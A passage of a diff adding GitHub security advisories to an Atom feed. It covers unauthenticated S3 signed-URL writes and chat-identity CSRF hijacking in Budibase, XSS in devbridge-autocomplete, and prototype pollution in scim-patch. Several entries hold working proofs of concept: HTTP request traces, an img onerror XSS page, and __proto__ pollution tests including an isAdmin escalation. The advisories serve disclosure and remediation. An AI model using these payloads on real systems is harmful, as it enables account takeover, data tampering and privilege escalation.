+612:      ctx.throw(400, "bucket and key values are required")
+613:    }
+614:    try {
+615:      let endpoint = datasource?.config?.endpoint
+616:      if (endpoint &amp;&amp; !utils.urlHasProtocol(endpoint)) {
+617:        endpoint = `https://${endpoint}`
+618:      }
+619:      const s3 = new S3({
+620:        region: awsRegion,
+621:        endpoint: endpoint,
+622:        credentials: {
+623:          accessKeyId: datasource?.config?.accessKeyId as string,
+624:          secretAccessKey: datasource?.config?.secretAccessKey as string,
+625:        },
+626:      })
+627:      const params = { Bucket: bucket, Key: key }
+628:      signedUrl = await getSignedUrl(s3, new PutObjectCommand(params))
+629:      if (endpoint) {
+</code></pre>
+<p>The endpoint returns the signed URL and public URL to the caller:</p>
+<ul>
+<li><code>packages/server/src/api/controllers/static/index.ts:630-639</code></li>
+</ul>
+<pre><code class="language-ts">630:        publicUrl = `${endpoint}/${bucket}/${key}`
+631:      } else {
+632:        publicUrl = `https://${bucket}.s3.${awsRegion}.amazonaws.com/${key}`
+633:      }
+634:    } catch (error: any) {
+635:      ctx.throw(400, error)
+636:    }
+637:  }
+638:
+639:  ctx.body = { signedUrl, publicUrl }
+</code></pre>
+<p>Because no authorization middleware is applied, the API trusts public input to choose where the stored S3 credentials will write.</p>
+<h3 id="poc">PoC</h3>
+<p>Non-destructive validation approach:</p>
+<ol>
+<li>Create or identify a workspace with an S3 datasource.</li>
+<li>Obtain the production workspace ID and S3 datasource ID.</li>
+<li>Send an unauthenticated request with the workspace ID header and attacker-controlled bucket/key:</li>
+</ol>
+<pre><code class="language-http">POST /api/attachments/&lt;datasourceId&gt;/url HTTP/1.1
+x-budibase-app-id: app_&lt;workspace-id&gt;
+content-type: application/json
+
+{"bucket":"attacker-controlled-or-permitted-bucket","key":"poc/budibase.txt"}
+</code></pre>
+<ol start="4">
+<li>Observe that the response contains a signed PUT URL.</li>
+<li>Upload harmless content to the returned <code>signedUrl</code> and confirm the object is created using the datasource's stored S3 credentials.</li>
+</ol>
+<h3 id="impact">Impact</h3>
+<p>This allows unauthenticated arbitrary object writes wherever the stored S3 datasource credentials have <code>PutObject</code> access. Depending on the datasource permissions, this can corrupt application data, overwrite public assets, place attacker-controlled objects in trusted buckets, consume storage, or abuse an organization's cloud credentials.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-jj36-r9w3-3pfh">https://github.com/Budibase/budibase/security/advisories/GHSA-jj36-r9w3-3pfh</a></li>
+<li><a href="https://github.com/Budibase/budibase/pull/18774">https://github.com/Budibase/budibase/pull/18774</a></li>
+<li><a href="https://github.com/Budibase/budibase/commit/d9dbb7f6105373cc88ecacdbcab70c776f7dd6a1">https://github.com/Budibase/budibase/commit/d9dbb7f6105373cc88ecacdbcab70c776f7dd6a1</a></li>
+<li><a href="https://github.com/advisories/GHSA-jj36-r9w3-3pfh">https://github.com/advisories/GHSA-jj36-r9w3-3pfh</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-jj36-r9w3-3pfh</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-06-22T23:15:10.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@budibase/server] Budibase has an Account Impersonation Issue — Chat Identity Link Hijacking via Missing Consent & CSRF]]></title>
+        <id>https://github.com/advisories/GHSA-v7j5-vc4m-723w</id>
+        <link href="https://github.com/advisories/GHSA-v7j5-vc4m-723w"/>
+        <updated>2026-06-22T23:08:23.000Z</updated>
+        <content type="html"><![CDATA[<h2>Title</h2>
+<p><strong>Chat Identity Link Hijacking — Attacker Can Silently Map Their Slack/Discord Identity to Any Authenticated Budibase User's Account</strong></p>
+<h2 id="severity">Severity</h2>
+<p><strong>High</strong> — CVSS 3.1: AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N = <strong>7.3</strong></p>
+<h2 id="affected-product">Affected Product</h2>
+<ul>
+<li><strong>Product:</strong> Budibase</li>
+<li><strong>Version:</strong> 3.37.2 (introduced in this version)</li>
+<li><strong>Component:</strong> <code>packages/server/src/api/controllers/ai/chatIdentityLinks.ts</code></li>
+<li><strong>Endpoint:</strong> <code>GET /api/chat-links/:instance/:token/handoff</code></li>
+</ul>
+<h2 id="vulnerability-type">Vulnerability Type</h2>
+<ul>
+<li>CWE-352: Cross-Site Request Forgery</li>
+<li>CWE-284: Improper Access Control</li>
+</ul>
+<hr>
+<h2 id="vulnerability-description">Vulnerability Description</h2>
+<p><code>GET /api/chat-links/:instance/:token/handoff</code> is a <strong>public endpoint</strong> (no auth required) that performs a permanent, state-changing operation: it binds an external chat identity (Slack/Discord/MS Teams) to an authenticated Budibase user account, with <strong>no consent UI and no CSRF protection</strong>.</p>
+<p>The session token in the URL is created <strong>by the attacker</strong> (from their own <code>/link</code> slash command) and embeds <strong>the attacker's <code>externalUserId</code></strong>. When an authenticated Budibase victim visits the URL, their account is silently and permanently linked to the attacker's Slack/Discord identity. The server responds with <code>"Authentication succeeded."</code> — no indication of what was linked.</p>
+<h3 id="route-registration">Route Registration</h3>
+<pre><code class="language-typescript">// packages/server/src/api/routes/chat.ts:22
+router.get(
+  "/api/chat-links/:instance/:token/handoff",
+  controller.handoffChatLinkSession   // registered in publicRoutes — zero auth middleware
+)
+</code></pre>
+<h3 id="vulnerable-controller-full-function">Vulnerable Controller (full function)</h3>
+<pre><code class="language-typescript">// packages/server/src/api/controllers/ai/chatIdentityLinks.ts:61–110
+export async function handoffChatLinkSession(
+  ctx: UserCtx&lt;void, string, { instance: string; token: string }&gt;
+) {
+  const token = resolveToken(ctx.params.token)
+  const session = await sdk.ai.chatIdentityLinks.getChatIdentityLinkSession(token)
+  if (!session) {
+    throw new HTTPError("Link token is invalid or has expired", 400)
+  }
+  assertSessionMatchesInstance({ workspaceId: session.workspaceId, instance: ctx.params.instance })
+
+  if (!ctx.isAuthenticated) {
+    // Unauthenticated: set return URL cookie, redirect to login
+    // After login, same URL is visited again → attack completes silently
+    utils.setCookie(ctx,
+      `/api/chat-links/${ctx.params.instance}/${token}/handoff`,
+      "budibase:returnurl",
+      { sign: false }  // ← unsigned cookie, but not an open redirect
+    )
+    ctx.redirect("/builder/auth/login")
+    return
+  }
+
+  const currentGlobalUserId = getCurrentGlobalUserId(ctx)
+  const consumedSession = await sdk.ai.chatIdentityLinks.consumeChatIdentityLinkSession(token)
+
+  // ↓↓↓ THE VULNERABLE WRITE — no consent check, no CSRF token ↓↓↓
+  await sdk.ai.chatIdentityLinks.upsertChatIdentityLink({
+    provider: consumedSession.provider,
+    externalUserId: consumedSession.externalUserId,  // ← ATTACKER's Slack ID
+    externalUserName: consumedSession.externalUserName,
+    teamId: consumedSession.teamId,
+    globalUserId: currentGlobalUserId,   // ← VICTIM's Budibase user ID
+    linkedBy: currentGlobalUserId,
+  })
+
+  ctx.type = "text/html"
+  ctx.body = renderLinkSuccessPage()  // ← "Authentication succeeded." — no disclosure to user
+}
+</code></pre>
+<hr>
+<h2 id="proof-of-concept--annotated-http-trace">Proof of Concept — Annotated HTTP Trace</h2>
+<h3 id="setup">Setup</h3>
+<table>
+<thead>
+<tr>
+<th>Role</th>
+<th>Identity</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Attacker</td>
+<td>Slack user <code>U_ATTACKER</code> (e.g. <code>UA12345678</code>), Budibase tenant <code>acme</code>, workspace ID <code>ws_abc123</code></td>
+</tr>
+<tr>
+<td>Victim</td>
+<td>Budibase admin, session cookie <code>budibase:session=VICTIM_SESSION</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="step-1--attacker-triggers-link-in-slack">Step 1 — Attacker triggers <code>/link</code> in Slack</h3>
+<p>Attacker types <code>/link</code> to the Budibase Slack bot. Budibase server creates a Redis session:</p>
+<p><strong>Redis key:</strong> <code>chatIdentityLinkSession:tok_xxxxxxxxxxxxxxxx</code></p>
+<p><strong>Redis value (exact structure from <code>ChatIdentityLinkSession</code> interface):</strong></p>
+<pre><code class="language-json">{
+  "token": "tok_xxxxxxxxxxxxxxxx",
+  "tenantId": "acme",
+  "workspaceId": "ws_abc123",
+  "provider": "slack",
+  "externalUserId": "UA12345678",
+  "externalUserName": "attacker",
+  "teamId": "T_ACME_SLACK",
+  "createdAt": "2026-05-02T10:00:00.000Z",
+  "expiresAt": "2026-05-02T10:10:00.000Z"
+}
+</code></pre>
+<p>Slack DM sent privately to attacker:</p>
+<pre><code>Link your Slack account to continue chatting with this agent.
+https://budibase.company.com/api/chat-links/ws_abc123/tok_xxxxxxxxxxxxxxxx/handoff
+</code></pre>
+<p><strong>Key observation:</strong> This URL embeds the attacker's own <code>externalUserId</code> inside the token. The attacker has full control over which identity gets linked.</p>
+<hr>
+<h3 id="step-2--attacker-forwards-url-to-victim">Step 2 — Attacker forwards URL to victim</h3>
+<p>Attacker posts in the company Slack:</p>
+<pre><code>@admin please click this to connect your Budibase account for AI agent access:
+https://budibase.company.com/api/chat-links/ws_abc123/tok_xxxxxxxxxxxxxxxx/handoff
+</code></pre>
+<hr>
+<h3 id="step-3--victim-clicks-link-authenticated">Step 3 — Victim clicks link (authenticated)</h3>
+<p><strong>HTTP Request (victim's browser):</strong></p>
+<pre><code class="language-http">GET /api/chat-links/ws_abc123/tok_xxxxxxxxxxxxxxxx/handoff HTTP/1.1
+Host: budibase.company.com
+Cookie: budibase:session=VICTIM_SESSION
+</code></pre>
+<p><strong>HTTP Response:</strong></p>
+<pre><code class="language-http">HTTP/1.1 200 OK
+Content-Type: text/html
+
+&lt;!doctype html&gt;
+&lt;html lang="en"&gt;
+  &lt;head&gt;
+    &lt;meta charset="utf-8"&gt;
+    &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;
+    &lt;title&gt;Authentication succeeded&lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+    &lt;p&gt;Authentication succeeded.&lt;/p&gt;
+    &lt;script&gt;
+      if (window.opener &amp;&amp; !window.opener.closed) {
+        try { window.opener.focus(); window.close() } catch (error) {}
+      }
+    &lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>The victim sees "Authentication succeeded." with no mention of Slack, no mention of <code>attacker</code>, no mention of what capabilities were granted.</p>
+<p><strong>CouchDB global-db document written immediately after (exact structure from <code>upsertChatIdentityLink</code>):</strong></p>
+<pre><code class="language-json">{
+  "_id": "chatidentitylink_acme_slack_T_ACME_SLACK_UA12345678",
+  "tenantId": "acme",
+  "provider": "slack",
+  "externalUserId": "UA12345678",
+  "globalUserId": "ro_global_us_VICTIM_ADMIN_ID",
+  "linkedAt": "2026-05-02T10:00:42.000Z",
+  "linkedBy": "ro_global_us_VICTIM_ADMIN_ID",
+  "externalUserName": "attacker",
+  "teamId": "T_ACME_SLACK",
+  "createdAt": "2026-05-02T10:00:42.000Z",
+  "updatedAt": "2026-05-02T10:00:42.000Z"
+}
+</code></pre>
+<p>The mapping is now permanent. <code>externalUserId = UA12345678</code> (attacker) → <code>globalUserId = ro_global_us_VICTIM_ADMIN_ID</code> (victim).</p>
+<hr>
+<h3 id="step-4--attacker-impersonates-victim-via-ai-agent">Step 4 — Attacker impersonates victim via AI agent</h3>
+<p>Attacker sends any message to the Budibase Slack bot from their own account (<code>UA12345678</code>).</p>
+<p>The chat handler resolves the identity:</p>
+<pre><code class="language-typescript">// packages/server/src/api/controllers/webhook/chatHandler.ts:421
+const existingLink = await sdk.ai.chatIdentityLinks.getChatIdentityLink({
+  provider: AgentChannelProvider.SLACK,
+  externalUserId: "UA12345678",     // ← attacker's Slack ID
+  teamId: "T_ACME_SLACK",
+})
+// existingLink.globalUserId = "ro_global_us_VICTIM_ADMIN_ID"
+
+const linkedUser = await getGlobalUser("ro_global_us_VICTIM_ADMIN_ID")
+// All agent tool calls now execute with victim admin's permissions
+</code></pre>
+<p>The attacker can now ask the agent:</p>
+<blockquote>
+<p>"Show me all rows in the Customers table"
+"Trigger the 'Send Invoice' automation for customer ID 42"
+"What files are in the knowledge base?"</p>
+</blockquote>
+<p>Each request runs with the victim admin's identity and permissions. The victim has no indication this is happening.</p>
+<hr>
+<h3 id="step-3b--variant-victim-not-yet-authenticated">Step 3b — Variant: Victim Not Yet Authenticated</h3>
+<p>If the victim is not currently logged in when they click the URL:</p>
+<p><strong>HTTP Request:</strong></p>
+<pre><code class="language-http">GET /api/chat-links/ws_abc123/tok_xxxxxxxxxxxxxxxx/handoff HTTP/1.1
+Host: budibase.company.com
+</code></pre>
+<p><strong>HTTP Response:</strong></p>
+<pre><code class="language-http">HTTP/1.1 302 Found
+Location: /builder/auth/login
+Set-Cookie: budibase:returnurl=%2Fapi%2Fchat-links%2Fws_abc123%2Ftok_xxxxxxxxxxxxxxxx%2Fhandoff; Path=/
+</code></pre>
+<p>After the victim logs in, the browser follows the return URL and the attack completes identically to Step 3.</p>
+<hr>
+<h2 id="impact">Impact</h2>
+<table>
+<thead>
+<tr>
+<th>Dimension</th>
+<th>Detail</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Confidentiality</td>
+<td><strong>High</strong> — attacker reads all table rows, files, and knowledge base data accessible to victim</td>
+</tr>
+<tr>
+<td>Integrity</td>
+<td><strong>High</strong> — attacker writes rows and triggers automations (email, external API calls, record creation) as victim</td>
+</tr>
+<tr>
+<td>Availability</td>
+<td>None</td>
+</tr>
+<tr>
+<td>Auth required</td>
+<td><strong>Low</strong> — attacker only needs a Slack/Discord account in the same workspace as the Budibase bot</td>
+</tr>
+<tr>
+<td>User interaction</td>
+<td><strong>Required</strong> — victim clicks one link (trivial social engineering in any enterprise Slack)</td>
+</tr>
+<tr>
+<td>Scope</td>
+<td>Unchanged — impact is within the victim's Budibase tenant</td>
+</tr>
+<tr>
+<td>Persistence</td>
+<td><strong>Permanent</strong> — the link document persists in CouchDB until explicitly deleted; re-exploitation survives token rotation</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="why-severity-is-high-not-medium">Why Severity Is High (Not Medium)</h2>
+<p>The social engineering bar is near zero in enterprise Slack:</p>
+<ul>
+<li>The link looks like a legitimate Budibase URL on the company domain</li>
+<li>The message pattern ("link your account for AI agent access") matches the product's own UX</li>
+<li>A victim who clicks and sees "Authentication succeeded." has no reason to be suspicious</li>
+<li>The effect is <strong>permanent and silent</strong> — the victim never learns their account was linked</li>
+</ul>
+<p>Combined with admin-level access to all application data and automation triggers, this meets the bar for High.</p>
+<hr>
+<h2 id="remediation">Remediation</h2>
+<h3 id="minimum-fix--add-consent-page">Minimum Fix — Add Consent Page</h3>
+<p>Convert the handoff to a two-step flow:</p>
+<pre><code>GET  /api/chat-links/:instance/:token/handoff
+  → Show consent page: "You are linking your Budibase account to
+    [externalUserName]'s Slack identity ([provider]).
+    This allows them to interact with AI agents as you. [Confirm] [Cancel]"
+
+POST /api/chat-links/:instance/:token/handoff  (with CSRF token)
+  → Perform the upsertChatIdentityLink() write
+</code></pre>
+<p>Moving the write to <code>POST</code> removes it from <code>publicRoutes</code>, making Budibase's existing CSRF middleware apply automatically.</p>
+<h3 id="additional-hardening">Additional Hardening</h3>
+<ul>
+<li>Show the <code>externalUserName</code> and provider on the consent page</li>
+<li>Log the event to the audit trail (both identities, timestamp, IP)</li>
+<li>Optionally restrict linking to users with explicit permission (not all roles)</li>
+</ul>
+<hr>
+<p>Credits,
+Vishal Kumar B
+<a href="https://github.com/VishaaLlKumaaRr">https://github.com/VishaaLlKumaaRr</a></p>
+<h2 id="references">References</h2>
+<ul>
+<li><code>packages/server/src/api/routes/chat.ts:22</code> — public route registration</li>
+<li><code>packages/server/src/api/controllers/ai/chatIdentityLinks.ts:61–110</code> — full vulnerable controller</li>
+<li><code>packages/server/src/sdk/workspace/ai/chatIdentityLinks.ts:135–165</code> — session creation (embeds attacker's externalUserId)</li>
+<li><code>packages/server/src/sdk/workspace/ai/chatIdentityLinks.ts:202–247</code> — upsertChatIdentityLink (permanent write)</li>
+<li><code>packages/server/src/api/controllers/webhook/chatHandler.ts:421</code> — identity resolution during agent message handling</li>
+<li><code>packages/server/src/ai/tools/budibase/automations.ts</code> — automation trigger capability</li>
+<li><code>packages/server/src/ai/tools/budibase/rows.ts</code> — row read/write capability</li>
+<li><code>packages/types/src/sdk/chatIdentityLinks.ts</code> — session + link type definitions</li>
+<li>CWE-352: Cross-Site Request Forgery</li>
+<li>CWE-284: Improper Access Control</li>
+</ul>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-v7j5-vc4m-723w">https://github.com/Budibase/budibase/security/advisories/GHSA-v7j5-vc4m-723w</a></li>
+<li><a href="https://github.com/Budibase/budibase/pull/18793">https://github.com/Budibase/budibase/pull/18793</a></li>
+<li><a href="https://github.com/Budibase/budibase/commit/cf66fb45d27402bace312d85616ddd4257f3a5aa">https://github.com/Budibase/budibase/commit/cf66fb45d27402bace312d85616ddd4257f3a5aa</a></li>
+<li><a href="https://github.com/advisories/GHSA-v7j5-vc4m-723w">https://github.com/advisories/GHSA-v7j5-vc4m-723w</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-v7j5-vc4m-723w</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-06-22T23:08:23.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[devbridge-autocomplete] devbridge-autocomplete has XSS in its default formatters: formatGroup and formatResult fail to escape HTML in untrusted inputs]]></title>
+        <id>https://github.com/advisories/GHSA-hvqh-jw65-wcpq</id>
+        <link href="https://github.com/advisories/GHSA-hvqh-jw65-wcpq"/>
+        <updated>2026-06-22T23:00:51.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The default <code>formatGroup</code> and <code>formatResult</code> functions in <code>devbridge-autocomplete</code> concatenate values into HTML without escaping, allowing XSS when an attacker controls (or can taint) the suggestion data source.</p>
+<h3 id="details">Details</h3>
+<p><strong>1. <code>formatGroup</code> — <code>category</code> is interpolated raw.</strong></p>
+<p><code>src/format.ts</code>:</p>
+<pre><code class="language-ts">function formatGroup(suggestion, category) {
+    return '&lt;div class="autocomplete-group"&gt;' + category + '&lt;/div&gt;';
+}
+</code></pre>
+<p>If <code>groupBy</code> is used and the grouping field of any suggestion contains HTML, that HTML is executed.</p>
+<p><strong>2. <code>formatResult</code> — early-return branch returns <code>suggestion.value</code> raw.</strong></p>
+<p><code>src/format.ts</code>:</p>
+<pre><code class="language-ts">function formatResult(suggestion, currentValue) {
+    if (!currentValue) {
+        return suggestion.value;   // un-escaped
+    }
+    /* ... non-empty path escapes correctly ... */
+}
+</code></pre>
+<p>The early-return branch is reached when <code>suggest()</code> renders with an empty <code>currentValue</code>, which happens with <code>minChars: 0</code> and a server that returns suggestions for an empty query. The returned string is concatenated into the container's <code>innerHTML</code>.</p>
+<h3 id="poc-formatgroup">PoC (formatGroup)</h3>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;meta charset="utf-8"&gt;
+    &lt;title&gt;PoC: formatGroup XSS in jQuery-Autocomplete v2.0.0&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;input id="ac" type="text" placeholder="Type 'a' to trigger" autocomplete="off"&gt;
+
+    &lt;script src="https://code.jquery.com/jquery-3.7.1.min.js"&gt;&lt;/script&gt;
+    &lt;script src="dist/jquery.autocomplete.js"&gt;&lt;/script&gt;
+    &lt;script&gt;
+        var poisoned = [
+            { value: 'Apple',   data: { category: "&lt;img src=x onerror=\"alert('XSS via formatGroup')\"&gt;" } },
+            { value: 'Avocado', data: { category: 'Safe Group' } }
+        ];
+
+        $('#ac').devbridgeAutocomplete({
+            lookup: poisoned,
+            groupBy: 'category',
+            minChars: 1
+        });
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>Originally identified by an earlier human analysis; the PoC above was produced with the assistance of Claude Opus 4.7.</p>
+<h3 id="impact">Impact</h3>
+<p>XSS in pages that render attacker-controllable suggestion data. The actual impact depends on what the embedding page has access to (cookies, session tokens, DOM), per standard reflected/stored XSS.</p>
+<h3 id="patch">Patch</h3>
+<p>Both formatters now run their interpolated input through the browser's text-node escaping (<code>createElement</code> + <code>textContent</code>) before producing the HTML string. Fixed in version <code>2.0.1</code>.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/devbridge/jQuery-Autocomplete/security/advisories/GHSA-hvqh-jw65-wcpq">https://github.com/devbridge/jQuery-Autocomplete/security/advisories/GHSA-hvqh-jw65-wcpq</a></li>
+<li><a href="https://github.com/devbridge/jQuery-Autocomplete/commit/63ff096ff5b77a90aac7fb5dad7c86e538a59ce0">https://github.com/devbridge/jQuery-Autocomplete/commit/63ff096ff5b77a90aac7fb5dad7c86e538a59ce0</a></li>
+<li><a href="https://github.com/advisories/GHSA-hvqh-jw65-wcpq">https://github.com/advisories/GHSA-hvqh-jw65-wcpq</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-hvqh-jw65-wcpq</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-06-22T23:00:50.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[scim-patch] scimPatch vulnerable to prototype pollution via unfiltered keys in patch]]></title>
+        <id>https://github.com/advisories/GHSA-9m6g-wc8r-q59c</id>
+        <link href="https://github.com/advisories/GHSA-9m6g-wc8r-q59c"/>
+        <updated>2026-06-22T22:57:49.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p><code>scim-patch</code> performs prototype pollution when applying a SCIM PATCH operation whose <code>value</code> object contains a key like <code>"__proto__.someProp"</code>. After one such patch,
+<code>Object.prototype.someProp</code> is set process-wide, affecting every plain object in the Node process.</p>
+<p>Any service that calls <code>scimPatch()</code> on attacker-controlled JSON (i.e. any SCIM endpoint accepting <code>PATCH</code> from an external IdP) is exploitable on a stock Node runtime.</p>
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Class:</strong> Prototype pollution (<a href="https://cwe.mitre.org/data/definitions/1321.html">CWE-1321</a>)</li>
+<li><strong>Affected versions:</strong> <code>&lt;= 0.9.0</code> (current HEAD <code>871b1e2</code>)</li>
+<li><strong>Attack vector:</strong> Network — sent as part of a normal SCIM <code>PATCH /Users/:id</code> request body.</li>
+<li><strong>Privileges required:</strong> Whatever the SCIM endpoint requires. For most integrations that's a provisioned IdP, which is "low" in CVSS terms (any authenticated provisioning client).</li>
+<li><strong>Scope:</strong> Changed — the bug is in a SCIM library but the side effect (<code>Object.prototype</code> mutation) leaks into the entire Node process.</li>
+</ul>
+<p>Downstream consequences depend on what other code reads from plain objects. Realistic outcomes observed in similar bugs:</p>
+<ul>
+<li><strong>Privilege escalation</strong> if any auth/middleware code checks <code>actor.isAdmin</code> / <code>req.user.admin</code> / similar boolean flags against a plain object that <em>expects</em> the key to be absent.</li>
+<li><strong>Logic bypass / DoS</strong> if any code branches on <code>obj.name</code>, <code>obj.type</code>, <code>obj.id</code> etc. against plain objects (e.g. <code>pg</code>'s prepared-statement naming check — a real incident at one consumer).</li>
+<li><strong>Persistence:</strong> lasts until the Node process restarts, so the blast radius is <em>every</em> request that container handles after the pollution.</li>
+</ul>
+<h2 id="root-cause">Root cause</h2>
+<p>In <code>src/scimPatch.ts:415-427</code>, <code>addOrReplaceObjectAttribute</code> iterates the user-supplied <code>patch.value</code> with <code>Object.entries</code> and feeds each key to <code>resolvePaths</code>, which splits on <code>.</code>:</p>
+<pre><code class="language-ts">function addOrReplaceObjectAttribute(property: any, patch: ScimPatchAddReplaceOperation, multiValuedPathFilter?: boolean): any {
+    if (typeof patch.value !== 'object') { ... }
+
+    // src/scimPatch.ts:423-427
+    for (const [key, value] of Object.entries(patch.value)) {
+        assign(property, resolvePaths(key), value, patch.op);
+    }
+    return property;
+}
+</code></pre>
+<p><code>assign</code> then walks the resulting key path with no filtering on dangerous keys (<code>src/scimPatch.ts:437-445</code>):</p>
+<pre><code class="language-ts">function assign(obj: any, keyPath: Array&lt;string&gt;, value: any, op: string) {
+    const lastKeyIndex = keyPath.length - 1;
+    for (let i = 0; i &lt; lastKeyIndex; ++i) {
+        const key = keyPath[i];
+        if (!(key in obj)) {
+            obj[key] = {};
+        }
+        obj = obj[key];   // ← obj["__proto__"] === Object.prototype
+    }
+    // ... assigns into Object.prototype
+}
+</code></pre>
+<p>For <code>keyPath = ["__proto__", "polluted"]</code>:</p>
+<ul>
+<li><code>"__proto__" in obj</code> is always true, so the fresh-object branch is skipped.</li>
+<li><code>obj = obj["__proto__"]</code> now points to <code>Object.prototype</code>.</li>
+<li>The final write lands on <code>Object.prototype.polluted</code>.</li>
+</ul>
+<p>The same shape works for <code>constructor.prototype</code> keys.</p>
+<h2 id="proof-of-concept">Proof of concept</h2>
+<p>Drop this in <code>test/prototypePollution.test.ts</code> and run <code>npm run build &amp;&amp; npx mocha lib/test/prototypePollution.test.js</code>. Both tests pass against HEAD <code>871b1e2</code>:</p>
+<pre><code class="language-ts">import { scimPatch } from '../src/scimPatch';
+import { ScimUser } from './types/types.test';
+import { expect } from 'chai';
+
+describe('Prototype pollution via scim-patch', () =&gt; {
+    let scimUser: ScimUser;
+
+    beforeEach(() =&gt; {
+        scimUser = JSON.parse(`{
+          "schemas": ["urn:ietf:params:scim:schemas:core:2.0:User"],
+          "id": "tea_4",
+          "userName": "spiderman",
+          "name": { "familyName": "Parker", "givenName": "Peter" },
+          "active": true,
+          "emails": [{ "value": "spiderman@superheroes.com", "primary": true }],
+          "roles": [],
+          "meta": { "resourceType": "User", "created": "x", "lastModified": "x", "location": "x" }
+        }`);
+    });
+
+    afterEach(() =&gt; {
+        delete (Object.prototype as any).polluted;
+        delete (Object.prototype as any).isAdmin;
+    });
+
+    it('pollutes Object.prototype via a value-key containing __proto__', () =&gt; {
+        expect(({} as any).polluted).to.equal(undefined);
+
+        scimPatch(scimUser, [{
+            op: 'add',
+            path: 'name',
+            value: { '__proto__.polluted': 'yes' }
+        }]);
+
+        expect((Object.prototype as any).polluted).to.equal('yes');
+        expect(({} as any).polluted).to.equal('yes');
+    });
+
+    it('elevates Object.prototype.isAdmin — the admin-escalation shape', () =&gt; {
+        expect(({} as any).isAdmin).to.equal(undefined);
+
+        scimPatch(scimUser, [{
+            op: 'add',
+            path: 'name',
+            value: { '__proto__.isAdmin': true }
+        }]);
+
+        expect((Object.prototype as any).isAdmin).to.equal(true);
+        expect(({} as any).isAdmin).to.equal(true);
+    });
+});
+</code></pre>
+<h2 id="suggested-fix">Suggested fix</h2>
+<p>Reject the three dangerous keys in <code>assign()</code> before the walk. Minimal patch:</p>
+<pre><code class="language-ts">const DANGEROUS_KEYS = new Set(['__proto__', 'constructor', 'prototype']);
+
+function assign(obj: any, keyPath: Array&lt;string&gt;, value: any, op: string) {
+    for (const key of keyPath) {
+        if (DANGEROUS_KEYS.has(key)) {
+            throw new InvalidScimPatchOp(`Forbidden key in patch path: ${key}`);
+        }
+    }
+    // ... existing logic
+}
+</code></pre>
+<p>Alternative, slightly safer: switch the walk target to <code>Object.create(null)</code> nodes when creating intermediate objects, and use <code>Object.defineProperty(obj, key, { value, enumerable: true, configurable: true, writable: true })</code> instead of <code>obj[key] = value</code> for the final write. That defends against future prototype-walking sinks even if a key sneaks past the denylist.</p>
+<p>Either approach is a non-breaking change — legitimate SCIM clients never send these keys.</p>
+<h2 id="mitigation-for-consumers-who-cant-upgrade-immediately">Mitigation for consumers who can't upgrade immediately</h2>
+<p>Calling <code>Object.freeze(Object.prototype)</code> (and the same on <code>Array.prototype</code>, <code>Function.prototype</code>) at process startup neutralizes this class of bug — assignment to a frozen prototype becomes a silent no-op in sloppy mode or a <code>TypeError</code> in strict mode. Node's <code>--frozen-intrinsics</code> flag does this for built-ins automatically.</p>
+<h2 id="credit">Credit</h2>
+<p>Discovered by <strong>Lee Wang (Notion)</strong>. Reported by <strong>David Wu (Notion)</strong>.</p>
+<p>Report authored by <strong>Claude</strong>. Reviewed by <strong>David Wu</strong>.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/thomaspoignant/scim-patch/security/advisories/GHSA-9m6g-wc8r-q59c">https://github.com/thomaspoignant/scim-patch/security/advisories/GHSA-9m6g-wc8r-q59c</a></li>
+<li><a href="https://github.com/thomaspoignant/scim-patch/commit/260f9cd2ac5ceac3976978850bb47dcb391720f6">https://github.com/thomaspoignant/scim-patch/commit/260f9cd2ac5ceac3976978850bb47dcb391720f6</a></li>
+<li><a href="https://github.com/advisories/GHSA-9m6g-wc8r-q59c">https://github.com/advisories/GHSA-9m6g-wc8r-q59c</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-9m6g-wc8r-q59c</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-06-22T22:57:48.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@budibase/server] Budibase: SSRF via OAuth2 token endpoint URL reaches internal hosts and cloud metadata]]></title>
+        <id>https://github.com/advisories/GHSA-4q6h-8p4v-67vq</id>
+        <link href="https://github.com/advisories/GHSA-4q6h-8p4v-67vq"/>
+        <updated>2026-06-22T22:45:36.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
